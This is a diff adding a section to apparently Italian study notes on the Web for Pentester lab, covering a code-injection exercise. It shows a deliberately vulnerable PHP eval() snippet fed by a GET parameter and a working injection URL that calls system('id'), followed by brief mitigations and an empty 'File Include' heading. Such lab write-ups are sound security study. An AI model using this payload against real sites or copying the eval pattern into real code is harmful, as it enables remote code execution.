@@ -561,9 +561,49 @@ e lo lanciamo usando il doppio `cat`
 
 <center>
 
-# Web4PenTesters
+# Web4PenTesters - WFP
 
 </center>
+
+
+## Code Injection 1:  
+
+
+La pagina web utilizza il parametro della richiesta `_GET` per stampare un messaggio che viene riflesso da un comando echo lanciato tramite `eval()`
+
+
+```php
+<?php require_once("../header.php"); ?>
+
+<?php 
+    $str="echo \"Hello ".$_GET['name']."!!!\";";
+    eval($str);
+?>
+<?php require_once("../footer.php"); ?>
+```
+
+Dato che l'input viene riflesso in una stringa che viene eseguita in una shell, è possibile usare una command injection per eseguire statement arbitrari 
+
+
+La struttura dell'input malevolo è la seguente:
+
+```
+name = hacker"
+     + ;
+     + system("id");
+     + "
+```
+
+`/codeexec/example1.php?name=hacker%22;system(%22id%22);%22`
+
+
+**Mitigazioni**:
+- Controllare l'input e abbassare i privilegi 
+- Rimuovere la stampa di stderr cambiando il file di configurazione php 
+
+## File Include 1
+
+
 
 
 
